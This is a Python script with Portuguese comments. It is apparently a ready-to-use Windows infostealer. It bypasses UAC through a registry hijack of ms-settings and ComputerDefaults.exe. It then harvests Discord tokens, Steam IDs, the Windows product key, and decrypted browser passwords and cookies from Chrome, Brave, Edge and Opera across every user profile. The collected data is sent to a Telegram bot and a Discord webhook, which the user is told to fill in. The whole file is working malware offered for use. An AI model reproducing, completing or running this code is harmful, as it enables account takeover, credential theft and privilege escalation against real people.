import os
import re
import sys
import ctypes
import winreg
import subprocess
import logging
from shutil import copy2
from base64 import b64decode
from json import loads
from sqlite3 import connect
import win32crypt
from Crypto.Cipher import AES
import socket
import requests
import platform
import uuid
import sqlite3
import tempfile

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Função para criar chave de registro para o bypass UAC
def create_reg_key(key, value):
    try:
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\shell\open\command')
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\shell\open\command', 0, winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)
        winreg.CloseKey(registry_key)
        logging.info("Chave de registro criada com sucesso.")
    except WindowsError as e:
        logging.error(f"Erro ao criar chave de registro: {e}")
        raise

# Função para executar o bypass UAC
def exec_bypass_uac(cmd):
    try:
        create_reg_key('DelegateExecute', '')
        create_reg_key(None, cmd)
        logging.info("Comando para bypass UAC configurado.")
    except WindowsError as e:
        logging.error(f"Erro ao executar bypass UAC: {e}")
        raise

# Função principal para contornar o UAC
def bypass_uac():
    try:
        cmd = r"C:\windows\System32\cmd.exe"
        exec_bypass_uac(cmd)
        os.system(r'C:\windows\system32\ComputerDefaults.exe')
        logging.info("UAC bypassed com sucesso.")
        return True
    except WindowsError as e:
        logging.error(f"Erro ao tentar contornar UAC: {e}")
        sys.exit(1)

# Obtendo os diretórios do sistema
def get_user_profiles():
    users_dir = os.path.join(os.getenv('SYSTEMDRIVE') + '\\', 'Users')
    return [os.path.join(users_dir, user) for user in os.listdir(users_dir) if os.path.isdir(os.path.join(users_dir, user))]

tokenPaths = {
    'Discord': r"\AppData\Roaming\Discord",
    'Discord Canary': r"\AppData\Roaming\discordcanary",
    'Discord PTB': r"\AppData\Roaming\discordptb",
    'Google Chrome': r"\AppData\Local\Google\Chrome\User Data\Default",
    'Opera': r"\AppData\Roaming\Opera Software\Opera Stable",
    'Brave': r"\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default",
    'Yandex': r"\AppData\Local\Yandex\YandexBrowser\User Data\Default",
    'OperaGX': r"\AppData\Roaming\Opera Software\Opera GX Stable",
    'Steam': r"\AppData\Roaming\Steam"
}

browser_loc = {
    "Chrome": r"\AppData\Local\Google\Chrome",
    "Brave": r"\AppData\Local\BraveSoftware\Brave-Browser",
    "Edge": r"\AppData\Local\Microsoft\Edge",
    "Opera": r"\AppData\Roaming\Opera Software\Opera Stable",
    "OperaGX": r"\AppData\Roaming\Opera Software\Opera GX Stable",
}

# Função para obter informações do sistema
def get_system_info():
    try:
        os_info = {
            "Nome do Computador": platform.node(),
            "Sistema Operacional": platform.system() + " " + platform.release(),
            "Chave do Windows": get_windows_key(),
            "Endereço MAC": get_mac_address()
        }
        return os_info
    except Exception as e:
        return {"Erro": str(e)}

# Função para coletar o endereço MAC
def get_mac_address():
    try:
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8 * 6, 8)][::-1])
        return mac if mac else "Endereço MAC não encontrado."
    except Exception:
        return "Endereço MAC não encontrado."

# Função para obter a chave do Windows
def get_windows_key():
    try:
        key = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey', shell=True)
        return key.strip().decode().split('\n')[1]
    except Exception:
        return "Chave do Windows não encontrada."

# Função para descriptografar token do Discord
def decrypt_token(buff, master_key):
    try:
        return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return None

# Função para extrair tokens do Discord
def get_tokens(path):
    tokens = set()
    lev_db = os.path.join(path, "Local Storage", "leveldb")
    loc_state = os.path.join(path, "Local State")

    if os.path.exists(loc_state):
        with open(loc_state, "r") as file:
            key = loads(file.read())['os_crypt']['encrypted_key']
        for file_name in os.listdir(lev_db):
            if file_name.endswith(".ldb") or file_name.endswith(".log"):
                try:
                    with open(os.path.join(lev_db, file_name), "r", errors='ignore') as files:
                        for line in files.readlines():
                            line = line.strip()
                            token_match = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', line)
                            for token in token_match:
                                decrypted = decrypt_token(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
                                if decrypted:
                                    tokens.add(decrypted)
                except PermissionError:
                    continue
    else:
        for file_name in os.listdir(path):
            if file_name.endswith('.log') or file_name.endswith('.ldb'):
                try:
                    for line in open(os.path.join(path, file_name), errors='ignore').readlines():
                        for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                            token = re.findall(regex, line)
                            if token:
                                tokens.add(token[0])
                except:
                    continue
    return list(tokens)

# Função para obter tokens da Steam
def get_steam_tokens(path):
    steam_tokens = []
    config_file = os.path.join(path, 'config', 'loginusers.vdf')
    if os.path.exists(config_file):
        try:
            with open(config_file, 'r', encoding='utf-8') as file:
                data = file.read()
                steam_tokens = re.findall(r'"SteamID"\s*"(\d+)"', data)
        except Exception as e:
            print(f"Erro ao extrair tokens da Steam: {e}")
    return steam_tokens

# Funções para obter caminhos do navegador
def LocalState(path):
    return os.path.join(path, 'User Data', 'Local State')

def Login_Data(path):
    return os.path.join(path, 'User Data', 'Default', 'Login Data')

def Cookies(path):
    return os.path.join(path, 'User Data', 'Default', 'Network', 'Cookies')

# Função para descriptografar o conteúdo do navegador e extrair os dados
def decrypt_browser(LocalState, LoginData, CookiesFile, name):
    message = ""
    try:
        if os.path.exists(LocalState):
            with open(LocalState) as f:
                local_state = loads(f.read())
                master_key = b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

                with tempfile.NamedTemporaryFile(delete=True) as temp_login:
                    if os.path.exists(LoginData):
                        copy2(LoginData, temp_login.name)
                        with connect(temp_login.name) as conn:
                            cur = conn.cursor()
                            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                            message += f"\n {name} - Login \n"
                            for logins in cur.fetchall():
                                try:
                                    if logins[0] and logins[1] and logins[2]:
                                        ciphers = logins[2]
                                        init_vector = ciphers[3:15]
                                        enc_pass = ciphers[15:-16]

                                        cipher = AES.new(master_key, AES.MODE_GCM, init_vector)
                                        dec_pass = cipher.decrypt(enc_pass).decode()
                                        message += f"URL: {logins[0]}\nUsuário: {logins[1]}\nSenha: {dec_pass}\n"
                                except Exception as e:
                                    print(f"Erro ao descriptografar login: {e}")
                                    continue

                with tempfile.NamedTemporaryFile(delete=True) as temp_cookie:
                    if os.path.exists(CookiesFile):
                        copy2(CookiesFile, temp_cookie.name)
                        with connect(temp_cookie.name) as conn:
                            curr = conn.cursor()
                            curr.execute("SELECT host_key, name, encrypted_value FROM cookies")
                            message += f"\n {name} - Cookies \n"
                            for cookies in curr.fetchall():
                                try:
                                    if cookies[0] and cookies[1] and cookies[2]:
                                        ciphers = cookies[2]
                                        init_vector = ciphers[3:15]
                                        enc_pass = ciphers[15:-16]
                                        cipher = AES.new(master_key, AES.MODE_GCM, init_vector)
                                        dec_pass = cipher.decrypt(enc_pass).decode()
                                        message += f'URL: {cookies[0]}\nNome: {cookies[1]}\nCookie: {dec_pass}\n'
                                except Exception as e:
                                    print(f"Erro ao descriptografar cookie: {e}")
                                    continue
    except Exception as e:
        print(f"Erro ao descriptografar dados do navegador: {e}")

    return message.strip()

# Função para enviar dados ao webhook ou Telegram
def post_to(file_content):
    token = "TELEGRAM TOKEN"  # Coloque seu token aqui
    chat_id = "TELEGRAM CHATID"  # Coloque o ID do chat aqui
    webhook_url = "URL WEBHOOK"  # URL do webhook do Discord

    # Enviar para Telegram
    if token != "TELEGRAM TOKEN" and chat_id != "TELEGRAM CHATID":
        try:
            requests.post(
                "https://api.telegram.org/bot" + token + "/sendMessage", 
                data={'chat_id': chat_id, 'text': file_content}
            )
        except Exception as e:
            print(f"Erro ao enviar para o Telegram: {e}")

    # Enviar para Webhook do Discord
    try:
        requests.post(webhook_url, json={"content": file_content})
    except Exception as e:
        print(f"Erro ao enviar para o webhook: {e}")

# Função principal para consolidar as informações e enviá-las
def main():
    if bypass_uac():
        mensagem = ""

        # Obter informações do sistema
        sys_info = get_system_info()
        for key, value in sys_info.items():
            mensagem += f"{key}: {value}\n"

        # Coletar tokens do Discord e Steam de todos os perfis de usuário
        user_profiles = get_user_profiles()
        for user_profile in user_profiles:
            for platform, relative_path in tokenPaths.items():
                path = os.path.join(user_profile, relative_path)
                if os.path.exists(path):
                    if 'Steam' in platform:
                        steam_tokens = get_steam_tokens(path)
                        if steam_tokens:
                            mensagem += f"\nTokens Steam ({user_profile}):\n" + "\n".join(steam_tokens) + "\n"
                    else:
                        tokens = get_tokens(path)
                        if tokens:
                            mensagem += f"\nTokens {platform} ({user_profile}):\n" + "\n".join(tokens) + "\n"

        # Descriptografar navegadores e extrair dados de todos os perfis de usuário
        for user_profile in user_profiles:
            for name, relative_path in browser_loc.items():
                path = os.path.join(user_profile, relative_path)
                browser_data = decrypt_browser(LocalState(path), Login_Data(path), Cookies(path), name)
                if browser_data:
                    mensagem += f"\nDados do navegador ({user_profile}):\n" + browser_data + "\n"

        # Enviar a mensagem consolidada
        post_to(mensagem)

if __name__ == "__main__":
    main()
